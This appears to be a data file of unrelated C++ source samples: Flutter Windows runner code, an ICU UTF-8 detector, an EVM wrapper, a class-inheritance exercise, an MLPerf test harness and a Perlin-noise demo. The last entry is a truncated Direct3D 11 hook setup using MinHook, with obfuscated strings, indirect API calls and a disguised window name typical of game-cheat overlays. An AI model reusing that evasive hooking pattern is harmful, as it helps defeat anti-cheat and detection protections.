    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "// \u00a9 2016 and later: Unicode, Inc. and others.\n// License & terms of use: http://www.unicode.org/copyright.html\n/*\n **********************************************************************\n *   Copyright (C) 2005-2014, International Business Machines\n *   Corporation and others.  All Rights Reserved.\n **********************************************************************\n */\n\n#include \"unicode/utypes.h\"\n\n#if !UCONFIG_NO_CONVERSION\n\n#include \"csrutf8.h\"\n#include \"csmatch.h\"\n\nU_NAMESPACE_BEGIN\n\nCharsetRecog_UTF8::~CharsetRecog_UTF8()\n{\n    // nothing to do\n}\n\nconst char *CharsetRecog_UTF8::getName() const\n{\n    return \"UTF-8\";\n}\n\nUBool CharsetRecog_UTF8::match(InputText* input, CharsetMatch *results) const {\n    bool hasBOM = FALSE;\n    int32_t numValid = 0;\n    int32_t numInvalid = 0;\n    const uint8_t *inputBytes = input->fRawInput;\n    int32_t i;\n    int32_t trailBytes = 0;\n    int32_t confidence;\n\n    if (input->fRawLength >= 3 && \n        inputBytes[0] == 0xEF && inputBytes[1] == 0xBB && inputBytes[2] == 0xBF) {\n            hasBOM = TRUE;\n    }\n\n    // Scan for multi-byte sequences\n    for (i=0; i < input->fRawLength; i += 1) {\n        int32_t b = inputBytes[i];\n\n        if ((b & 0x80) == 0) {\n            continue;   // ASCII\n        }\n\n        // Hi bit on char found.  Figure out how long the sequence should be\n        if ((b & 0x0E0) == 0x0C0) {\n            trailBytes = 1;\n        } else if ((b & 0x0F0) == 0x0E0) {\n            trailBytes = 2;\n        } else if ((b & 0x0F8) == 0xF0) {\n            trailBytes = 3;\n        } else {\n            numInvalid += 1;\n            continue;\n        }\n\n        // Verify that we've got the right number of trail bytes in the sequence\n        for (;;) {\n            i += 1;\n\n            if (i >= input->fRawLength) {\n                break;\n            }\n\n            b = inputBytes[i];\n\n            if ((b & 0xC0) != 0x080) {\n                numInvalid += 1;\n                break;\n            }\n\n            if (--trailBytes == 0) {\n                numValid += 1;\n                break;\n            }\n        }\n\n    }\n\n    // Cook up some sort of confidence score, based on presence of a BOM\n    //    and the existence of valid and/or invalid multi-byte sequences.\n    confidence = 0;\n    if (hasBOM && numInvalid == 0) {\n        confidence = 100;\n    } else if (hasBOM && numValid > numInvalid*10) {\n        confidence = 80;\n    } else if (numValid > 3 && numInvalid == 0) {\n        confidence = 100;\n    } else if (numValid > 0 && numInvalid == 0) {\n        confidence = 80;\n    } else if (numValid == 0 && numInvalid == 0) {\n        // Plain ASCII. Confidence must be > 10, it's more likely than UTF-16, which\n        //              accepts ASCII with confidence = 10.\n        confidence = 15;\n    } else if (numValid > numInvalid*10) {\n        // Probably corruput utf-8 data.  Valid sequences aren't likely by chance.\n        confidence = 25;\n    }\n\n    results->set(input, this, confidence);\n    return (confidence > 0);\n}\n\nU_NAMESPACE_END\n#endif\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <vector>\n#include <string>\n#include \"../include/processor.h\"\n\nextern \"C\" void eapp_print(const char*s, ...);\nextern \"C\" int evm_main(uint8_t* evm_code, uint64_t evm_code_size,\n                        uint8_t* evm_param, uint8_t evm_param_size,\n                        uint8_t* evm_output, uint8_t* evm_output_size,\n                        uint8_t* evm_log, uint64_t* evm_log_size,\n                        uint8_t* evm_value, uint64_t evm_gas,\n                        uint64_t* evm_last_gas);\n\nint evm_main(uint8_t* evm_code, uint64_t evm_code_size,\n             uint8_t* evm_param, uint8_t evm_param_size,\n             uint8_t* evm_output, uint8_t* evm_output_size,\n             uint8_t* evm_log, uint64_t* evm_log_size,\n             uint8_t* evm_value, uint64_t evm_gas,\n             uint64_t* evm_last_gas) {\n    std::vector<uint8_t> codes;\n    for(int i = 0; i < evm_code_size; i++){\n        codes.push_back(evm_code[i]);\n    }\n    std::vector<uint8_t> params;\n    for(int i = 0; i < evm_param_size; i++){\n        params.push_back(evm_param[i]);\n    }\n    uint256_t value = uint8_vector_to_uint256(evm_value, 32);\n\n    EVMProcessor* processor = new EVMProcessor(value);\n    EVMResult* result = processor->run(codes, params, evm_gas);\n\n    if(result == nullptr){\n        EVMProcessor* processor2 = new EVMProcessor(processor->get_context());\n        result = processor2->resume_evm();\n    }\n\n    for(int i = 0; i < result->output.size(); i++){\n        evm_output[i] = result->output[i];\n    }\n    *evm_output_size = result->output.size();\n    for(int i = 0; i < result->log.size(); i++){\n        evm_log[i] = result->log[i];\n    }\n    *evm_log_size = result->log.size();\n    *evm_last_gas = result->evm_last_gas;\n\n    return 0;\n}",
    "#include<iostream>\r\n#include<string.h>\r\nusing namespace std;\r\n\r\nclass Person{\r\n\tpublic:\r\n\tstring name;\r\n\tint age;\r\n\t\r\n};\r\n\r\nclass Student : public Person{\r\n\tpublic :\r\n\tstring PRN_No;\r\n\tstring Collage_Name;\r\n\t\r\n\tvoid setData(){\r\n\t\t\r\n\t\tcout<<\"Enter the name of Student : \";\r\n\t\tcin>>name;\r\n\t\tcout<<\"Enter the age of Student : \";\r\n\t\tcin>>age;\r\n\t\tcout<<\"Enter the PRN_No of Student : \";\r\n\t\tcin>>PRN_No;\r\n\t\tcout<<\"Enter the Collage_Name of Student : \";\r\n\t\tcin>>Collage_Name;\r\n\t\t\r\n\t}\r\n\t\r\n\tvoid getData(){\r\n\t\t\r\n\t\tcout<<\"Name of Student : \";\r\n\t\tcout<<name<<endl;\r\n\t\tcout<<\"Age of Student : \";\r\n\t\tcout<<age<<endl;\r\n\t\tcout<<\"PRN_No of Student : \";\r\n\t\tcout<<PRN_No<<endl;\r\n\t\tcout<<\"Collage_Name of Student : \";\r\n\t\tcout<<Collage_Name<<endl;\r\n\t\t\r\n\t}\r\n\t\r\n\t\r\n};\r\n\r\nclass Employee : public Person{\r\n\tpublic :\r\n\tstring Emp_Id_No;\r\n\tstring Position;\r\n\t\r\n\tvoid setData(){\r\n\t\t\r\n\t\tcout<<\"Enter the name of Employee : \";\r\n\t\tcin>>name;\r\n\t\tcout<<\"Enter the age of Employee : \";\r\n\t\tcin>>age;\r\n\t\tcout<<\"Enter the Emp_Id of Employee : \";\r\n\t\tcin>>Emp_Id_No;\r\n\t\tcout<<\"Enter the Position of Employee : \";\r\n\t\tcin>>Position;\r\n\t\t\r\n\t}\r\n\t\r\n\tvoid getData(){\r\n\t\t\r\n\t\tcout<<\"Name of Student : \";\r\n\t\tcout<<name<<endl;\r\n\t\tcout<<\"Age of Student : \";\r\n\t\tcout<<age<<endl;\r\n\t\tcout<<\"Emp_Id of Student : \";\r\n\t\tcout<<Emp_Id_No<<endl;\r\n\t\tcout<<\"Position of Student : \";\r\n\t\tcout<<Position<<endl;\r\n\t\t\r\n\t}\r\n\t\r\n};\r\n\r\nint main(){\r\n\t\r\n\tStudent s1; \r\n\tcout<<\"Enter the information of Student : \"<<endl<<endl;\r\n\ts1.setData();\r\n\tcout<<endl;\r\n\t\r\n\tEmployee e1;\r\n\tcout<<\"Enter the information of Employee : \"<<endl<<endl;\r\n\te1.setData();\r\n\tcout<<endl<<endl;\r\n\t\r\n\tcout<<\"Information of Student :\"<<endl;\r\n\ts1.getData();\r\n\tcout<<endl;\r\n\tcout<<\"Information of Employee :\"<<endl;\r\n\te1.getData();\r\n}\r\n",
    "/*\n * Copyright (c) 2020, NVIDIA CORPORATION.  All rights reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n#include <cassert>\n#include <condition_variable>\n#include <deque>\n#include <iostream>\n#include <map>\n#include <mutex>\n#include <thread>\n#include <vector>\n\n#include \"loadgen.h\"\n#include \"query_sample_library.h\"\n#include \"system_under_test.h\"\n#include \"test_settings.h\"\n\nclass QSL : public mlperf::QuerySampleLibrary {\n public:\n  ~QSL() override{};\n  const std::string& Name() override { return mName; }\n  size_t TotalSampleCount() override { return 1000000; }\n  size_t PerformanceSampleCount() override { return TotalSampleCount(); }\n  void LoadSamplesToRam(\n      const std::vector<mlperf::QuerySampleIndex>& samples) override {}\n  void UnloadSamplesFromRam(\n      const std::vector<mlperf::QuerySampleIndex>& samples) override {}\n\n private:\n  std::string mName{\"Dummy QSL\"};\n};\n\nclass BasicSUT : public mlperf::SystemUnderTest {\n public:\n  BasicSUT() {\n    // Start with some large value so that we don't reallocate memory.\n    initResponse(10000);\n  }\n  ~BasicSUT() override {}\n  const std::string& Name() override { return mName; }\n  void IssueQuery(const std::vector<mlperf::QuerySample>& samples) override {\n    int n = samples.size();\n    if (n > mResponses.size()) {\n      std::cerr << \"Warning: reallocating response buffer in BasicSUT. Maybe \"\n                   \"you should initResponse with larger value!?\"\n                << std::endl;\n      initResponse(samples.size());\n    }\n    for (int i = 0; i < n; i++) {\n      mResponses[i].id = samples[i].id;\n    }\n    mlperf::QuerySamplesComplete(mResponses.data(), n);\n  }\n  void FlushQueries() override {}\n\n private:\n  void initResponse(int size) {\n    mResponses.resize(size,\n                      {0, reinterpret_cast<uintptr_t>(&mBuf), sizeof(int)});\n  }\n  int mBuf{0};\n  std::string mName{\"BasicSUT\"};\n  std::vector<mlperf::QuerySampleResponse> mResponses;\n};\n\nclass QueueSUT : public mlperf::SystemUnderTest {\n public:\n  QueueSUT(int numCompleteThreads, int maxSize) {\n    // Each thread handle at most maxSize at a time.\n    std::cout << \"QueueSUT: maxSize = \" << maxSize << std::endl;\n    initResponse(numCompleteThreads, maxSize);\n    // Launch complete threads\n    for (int i = 0; i < numCompleteThreads; i++) {\n      mThreads.emplace_back(&QueueSUT::CompleteThread, this, i);\n    }\n  }\n  ~QueueSUT() override {\n    {\n      std::unique_lock<std::mutex> lck(mMtx);\n      mDone = true;\n      mCondVar.notify_all();\n    }\n    for (auto& thread : mThreads) {\n      thread.join();\n    }\n  }\n  const std::string& Name() override { return mName; }\n  void IssueQuery(const std::vector<mlperf::QuerySample>& samples) override {\n    std::unique_lock<std::mutex> lck(mMtx);\n    for (const auto& sample : samples) {\n      mIdQueue.push_back(sample.id);\n    }\n    // Let some worker thread to consume tasks\n    mCondVar.notify_one();\n  }\n  void FlushQueries() override {}\n\n private:\n  void CompleteThread(int threadIdx) {\n    auto& responses = mResponses[threadIdx];\n    size_t maxSize{responses.size()};\n    size_t actualSize{0};\n    while (true) {\n      {\n        std::unique_lock<std::mutex> lck(mMtx);\n        mCondVar.wait(lck, [&]() { return !mIdQueue.empty() || mDone; });\n\n        if (mDone) {\n          break;\n        }\n\n        actualSize = std::min(maxSize, mIdQueue.size());\n        for (int i = 0; i < actualSize; i++) {\n          responses[i].id = mIdQueue.front();\n          mIdQueue.pop_front();\n        }\n        mCondVar.notify_one();\n      }\n      mlperf::QuerySamplesComplete(responses.data(), actualSize);\n    }\n  }\n  void initResponse(int numCompleteThreads, int size) {\n    mResponses.resize(numCompleteThreads);\n    for (auto& responses : mResponses) {\n      responses.resize(size,\n                       {0, reinterpret_cast<uintptr_t>(&mBuf), sizeof(int)});\n    }\n  }\n  int mBuf{0};\n  std::string mName{\"QueueSUT\"};\n  std::vector<std::vector<mlperf::QuerySampleResponse>> mResponses;\n  std::vector<std::thread> mThreads;\n  std::deque<mlperf::ResponseId> mIdQueue;\n  std::mutex mMtx;\n  std::condition_variable mCondVar;\n  bool mDone{false};\n};\n\nclass MultiBasicSUT : public mlperf::SystemUnderTest {\n public:\n  MultiBasicSUT(int numThreads)\n      : mNumThreads(numThreads), mResponses(numThreads) {\n    // Start with some large value so that we don't reallocate memory.\n    initResponse(10000);\n    for (int i = 0; i < mNumThreads; ++i) {\n      mThreads.emplace_back(&MultiBasicSUT::startIss",
    "#define _USE_MATH_DEFINES\n#include <SFML/Graphics.hpp>\n#include <cmath>\n#include <vector>\n#include <algorithm>\n#include <random>\n#include <iostream>\n\nusing namespace std;\n\nclass Vector2 {\npublic:\n    float x, y;\n\n    Vector2(float _x, float _y) : x(_x), y(_y) {}\n\n    float dot(const Vector2& other) const {\n        return x * other.x + y * other.y;\n    }\n};\n\n// Fisher-Yates \uc54c\uace0\ub9ac\uc998.\nvoid Shuffle(std::vector<int>& arrayToShuffle) {\n    std::random_device rd;\n    std::mt19937 g(rd());\n\n    for (int e = arrayToShuffle.size() - 1; e > 0; e--) {\n        std::uniform_int_distribution<int> distribution(0, e - 1);\n        int index = distribution(g);\n\n        std::swap(arrayToShuffle[e], arrayToShuffle[index]);\n    }\n}\n\n// \ubbf8\ub9ac \ub9cc\ub4e0 \uc218\uc5f4\uc744 \uc0ac\uc6a9\ud55c\ub2e4. 0 - \nstd::vector<int> MakePermutation() {\n    std::vector<int> permutation;\n    for (int i = 0; i < 256; i++) {\n        permutation.push_back(i);\n    }\n\n    Shuffle(permutation);\n\n    for (int i = 0; i < 256; i++) {\n        permutation.push_back(permutation[i]);\n    }\n\n    return permutation;\n}\n\nconst std::vector<int> Permutation = MakePermutation();\n\nVector2 GetGradientVector(int v) {\n    int h = v & 3;\n    if (h == 0)\n        return Vector2(1.0f, 1.0f);\n    else if (h == 1)\n        return Vector2(-1.0f, 1.0f);\n    else if (h == 2)\n        return Vector2(-1.0f, -1.0f);\n    else\n        return Vector2(1.0f, -1.0f);\n}\n\nfloat Fade(float t) {\n    return ((6 * t - 15) * t + 10) * t * t * t;\n}\n\nfloat Lerp(float t, float a1, float a2) {\n    return a1 + t * (a2 - a1);\n}\n\nfloat Noise2D(float x, float y) {\n    // 1. \uac01 x, y \uc2e4\uc218\ub97c \uc785\ub825\uc73c\ub85c \ub450\uc5c8\uc744 \ub54c, \ud53d\uc140\ub4e4\uc740 \uc815\uc218 \uadf8\ub9ac\ub4dc\uc5d0 \uc874\uc7ac\ud569\ub2c8\ub2e4.\n\n    int X = static_cast<int>(std::floor(x)) & 255;\n    int Y = static_cast<int>(std::floor(y)) & 255;\n\n    // 1. \uc18c\uc218\ubd80\ub9cc \ub0a8\uae30\uac8c \ud569\ub2c8\ub2e4.\n    float xf = x - std::floor(x);\n    float yf = y - std::floor(y);\n\n    // 2. \ud574\ub2f9 \uc815\uc0ac\uac01\ud615 \uadf8\ub9ac\ub4dc \uac01 \uaf2d\uc9d3\uc810\uc5d0 \uadf8\ub798\ub514\uc5b8\ud2b8(\uae30\uc6b8\uae30) \ubca1\ud130\ub97c \ud560\ub2f9\ud569\ub2c8\ub2e4.\n    // 2-1. Ken Perlin \uc774 \uc81c\uc548\ud55c \uc21c\uc5f4\uc774 \uc874\uc7ac\ud569\ub2c8\ub2e4.\n    // 2-2. \uc21c\uc5f4\uc5d0\uc11c \uac12\uc744 \uac00\uc838\uc635\ub2c8\ub2e4. \uac01 \ubaa8\uc11c\ub9ac\ub4e4\uc5d0\uac8c \uc21c\uc5f4\uc758 \uac12\uc744 \ud560\ub2f9\ud569\ub2c8\ub2e4.\n    int valueTopRight = Permutation[Permutation[X + 1] + Y + 1];\n    int valueTopLeft = Permutation[Permutation[X] + Y + 1];\n    int valueBottomRight = Permutation[Permutation[X + 1] + Y];\n    int valueBottomLeft = Permutation[Permutation[X] + Y];\n\n    // 3. \uac01 \ubaa8\uc11c\ub9ac\uc810\uc5d0\uc11c \uc785\ub825 \uc810\uae4c\uc9c0\uc758 \uac70\ub9ac \ubca1\ud130\ub97c \uad6c\ud569\ub2c8\ub2e4.\n    Vector2 topRight(xf - 1.0f, yf - 1.0f);\n    Vector2 topLeft(xf, yf - 1.0f);\n    Vector2 bottomRight(xf - 1.0f, yf);\n    Vector2 bottomLeft(xf, yf);\n\n    // 4. \uac01 \ubaa8\uc11c\ub9ac \uc810\uc758 \uc624\ud504\uc14b \ubca1\ud130(\uc785\ub825 \uc810\uae4c\uc9c0\uc758 \uac70\ub9ac \ubca1\ud130) \uacfc \ubaa8\uc11c\ub9ac \uc810\uc758 \uae30\uc6b8\uae30\ub97c \ub0b4\uc801\ud569\ub2c8\ub2e4. \uadf8\ub798\ub514\uc5b8\ud2b8 \ubca1\ud130\uc758 \uc601\ud5a5\ub825\uc740 \uac70\ub9ac\uc5d0 \ub530\ub77c \ucee4\uc9d1\ub2c8\ub2e4.\n    float dotTopRight = topRight.dot(GetGradientVector(valueTopRight));\n    float dotTopLeft = topLeft.dot(GetGradientVector(valueTopLeft));\n    float dotBottomRight = bottomRight.dot(GetGradientVector(valueBottomRight));\n    float dotBottomLeft = bottomLeft.dot(GetGradientVector(valueBottomLeft));\n\n    // 5. \ubd80\ub4dc\ub7ec\uc6b4 \ubcf4\uac04(smooth interpolation)\uc744 \uc704\ud574 \uc0ac\uc6a9\ub429\ub2c8\ub2e4. \n    // \uc774 \ud568\uc218\ub294 \uc785\ub825 \uac12 t\ub97c 0\uc5d0\uc11c 1 \uc0ac\uc774\uc758 \uac12\uc73c\ub85c \ub9e4\ud551\ud558\uba70, \ub2e4\ud56d\uc2dd \uace1\uc120\uc744 \ub530\ub77c \ubcc0\ud654\ud569\ub2c8\ub2e4.\n    float u = Fade(xf);\n    float v = Fade(yf);\n\n    // 6. \ub0b4\uc801\ud55c \uac12\ub4e4\uc744 \ud63c\ud569\ud558\uc5ec \ub2e8\uc77c\uc758 \uac12\uc73c\ub85c \ub9cc\ub4ed\ub2c8\ub2e4. \n    float result = Lerp(v,\n        Lerp(u, dotBottomLeft, dotBottomRight), Lerp(u, dotTopLeft, dotTopRight));\n\n    return result;\n}\n\nfloat FractalBrownianMotion(float x, float y, int numOctaves) {\n    float result = 0.0f;\n    float amplitude = 1.0f;\n    float frequency = 0.005f;\n    float persistence = 0.5f;\n\n    for (int octave = 0; octave < numOctaves; octave++) {\n        float n = amplitude * Noise2D(x * frequency, y * frequency);\n        result += n;\n\n        amplitude *= persistence; \n        frequency *= 2.0f;\n    }\n\n    result = std::max(-1.0f, std::min(1.0f, result));\n\n    return result;\n}\n\nint main() {\n    const int windowWidth = 800;\n    const int windowHeight = 600;\n    const int numOctaves = 8;\n\n    sf::RenderWindow window(sf::VideoMode(windowWidth, windowHeight), \"Perlin Noise\");\n\n    sf::Image textureImage;\n    textureImage.create(windowWidth, windowHeight);\n\n    for (int y = 0; y < windowHeight; y++) {\n        for (int x = 0; x < windowWidth; x++) {\n            float persistence = 0.5f;\n            float frequency = 0.01f;\n            //float n = Noise2D(x * frequency, y * frequency);\n            //float value = n;\n            float value = FractalBrownianMotion(static_cast<float>(x), static_cast<float>(y), numOctaves);\n            value = (value + 1.0f) / 2.0f; // Normalize to [0, 1]\n\n            sf::Color color(static_cast<sf::Uint8>(255 * value), static_cast<sf::Uint8>(255 * value), static_cast<sf::Uint8>(255 * value));\n            textureImage.setPixel(x, y, color);\n        }\n    }\n\n    sf::Texture texture;\n    texture.loadFromImage(textureImage);\n    sf::Sprite sprite(texture);\n\n    while (window.isOpen()) {\n        sf::Event event;\n        while (window.pollEvent(event)) {\n            if (event.type == sf::Event::Closed)\n                window.close();\n        }\n\n        window.clear();\n        window.draw(sprite);\n        window.display();\n    }\n\n    return 0;\n}\n",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator 